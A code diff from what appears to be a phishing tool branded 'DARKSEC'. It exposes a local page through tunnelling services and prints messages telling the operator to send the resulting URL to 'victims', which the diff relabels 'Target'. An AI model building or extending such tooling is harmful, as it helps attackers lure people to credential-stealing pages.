@@ -307,7 +307,7 @@ def start_localxpose(port):
                 "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
             url = output.decode('utf-8')
             print(
-                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
+                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
                     default_palette[0], default_palette[4], default_palette[3], port, url) + "{0}".format(
                     default_palette[4]))
             print("\n")
@@ -341,7 +341,7 @@ def start_localxpose(port):
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(
                 default_palette[0], default_palette[2]))
             print(
-                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
+                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
                     default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(
                     default_palette[4]))
             print("\n")
@@ -406,7 +406,7 @@ def start_localtunnel(port, npm):
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(
             default_palette[0], default_palette[2]))
         print(
-            "\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(
+            "\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO Target-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(
                 default_palette[0], default_palette[2], default_palette[3], port,
                 str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)).strip("b ' \ n r")))
     except CalledProcessError:
@@ -468,7 +468,7 @@ def start_openport(port):
 	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(
             default_palette[0], default_palette[4]))
         print(
-            "\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(
+            "\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(
                 default_palette[0], default_palette[4], default_palette[3], port, url))
 
     print('''{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
